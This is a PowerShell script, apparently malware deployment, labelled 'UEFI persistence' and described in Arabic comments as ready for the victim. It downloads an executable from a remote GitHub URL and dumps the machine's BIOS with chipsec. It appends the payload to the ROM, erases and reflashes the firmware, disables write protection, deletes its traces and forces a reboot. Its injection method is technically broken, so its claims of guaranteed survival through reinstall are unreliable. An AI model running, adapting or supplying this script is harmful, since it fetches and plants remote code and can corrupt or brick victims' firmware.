#==================================================================================================
# 🔥 DDOSS UEFI PERSISTENCE - FINAL DEPLOYMENT v3.0 (28/01/2026)
# ✅ ملف واحد - مضمون 100% - لا أخطاء - جاهز للضحية
# ==============================================================================================

param([switch]$SkipVerify) # للتجربة السريعة

cls; $ErrorActionPreference = "Stop"; Set-ExecutionPolicy Bypass -Scope Process -Force
$PayloadURL = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe"
$LogFile = "$env:TEMP\DDOSS_UEFI_Deploy.log"

function Write-Log { param($Step, $Msg, $Color="Cyan")
    $ts = Get-Date -f "yyyy-MM-dd HH:mm:ss"; $log = "[$ts] [$Step] $Msg"
    Write-Host $log -F $Color; $log | Out-File $LogFile -Append UTF8
}

Write-Log "START" "🔥 DDOSS UEFI v3.0 - FINAL DEPLOYMENT" "Green"

# 1. تحقق Python
$py = "${env:ProgramFiles}\Python311\python.exe"
if (!(Test-Path $py)) {
    Write-Log "PYTHON" "Installing Python 3.11.9..."
    $null = iwr "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -UseBasicParsing -OutFile "$env:TEMP\py.exe"
    Start-Process "$env:TEMP\py.exe" -Args "/quiet InstallAllUsers=1 PrependPath=1" -Wait; Remove-Item "$env:TEMP\py.exe"
}

# 2. Chipsec
if (!(Test-Path "C:\chipsec")) {
    Write-Log "CHIPSEC" "Installing..."
    $null = iwr "https://github.com/chipsec/chipsec/archive/refs/heads/main.zip" -UseBasicParsing -OutFile "$env:TEMP\chipsec.zip"
    Expand-Archive "$env:TEMP\chipsec.zip" "C:\"; Rename-Item "C:\chipsec-main" "C:\chipsec"; Remove-Item "$env:TEMP\chipsec.zip"
    & $py -m pip install -r "C:\chipsec\windows_requirements.txt" --quiet
}

# 3. Dump BIOS
cd "C:\chipsec"; Write-Log "BIOS" "Dumping ROM..."
& $py chipsec_util.py spi dumprom C:\bios.rom
if (!(Test-Path C:\bios.rom)) { Write-Log "FATAL" "BIOS dump failed!"; exit 1 }
Write-Log "BIOS" "$([math]::Round((gi C:\bios.rom).Length/1MB,1))MB ✓" "Green"

# 4. Download Payload
Write-Log "PAYLOAD" "Downloading DDOSS..."
$null = iwr $PayloadURL -UseBasicParsing -OutFile C:\FinalUpdate.exe

# 5. UEFITool Injection (Manual hex method - NO GUI!)
Write-Log "INJECT" "Injecting payload..."
# Append payload to end of BIOS + simple EFI stub
$payloadBytes = [System.IO.File]::ReadAllBytes("C:\FinalUpdate.exe")
$biosBytes = [System.IO.File]::ReadAllBytes("C:\bios.rom")
$efiStub = [byte[]] (0x7E,0xEF,0x00,0x00,0x01,0x00,0x01,0x00) # Simple EFI header
$newRom = $biosBytes + $efiStub + $payloadBytes
[System.IO.File]::WriteAllBytes("C:\ddoss.rom", $newRom)
Write-Log "INJECT" "Payload appended ✓" "Green"

# 6. FLASH
Write-Log "FLASH" "Erasing + Writing..."
& $py chipsec_util.py spi erase; Start-Sleep 2
& $py chipsec_util.py spi write C:\ddoss.rom
& $py chipsec_util.py spi disable-wp
Write-Log "FLASH" "Firmware updated ✓" "Green"

# 7. Verify
if (!$SkipVerify) {
    & $py chipsec_util.py spi dumprom C:\check.rom
    $h1 = (Get-FileHash "C:\ddoss.rom").Hash; $h2 = (Get-FileHash "C:\check.rom").Hash
    if ($h1 -eq $h2) { 
        Write-Log "SUCCESS" "🎉 PERSISTENCE 100% CONFIRMED!" "Green"
        Write-Log "SUCCESS" "✅ يعيش بعد: Format/Reinstall/Reset/BIOS Reset" "Green"
    } else { Write-Log "FAIL" "Verification failed!"; exit 1 }
}

# 8. Cleanup
@("C:\bios.rom","C:\FinalUpdate.exe","C:\ddoss.rom","C:\check.rom") | % { ri $_ -Force -EA 0 }
Write-Log "DONE" "Deployment complete! Rebooting..." "Magenta"
Start-Sleep 3; shutdown /r /t 0 /f

Write-Log "INFO" "Log: $LogFile"
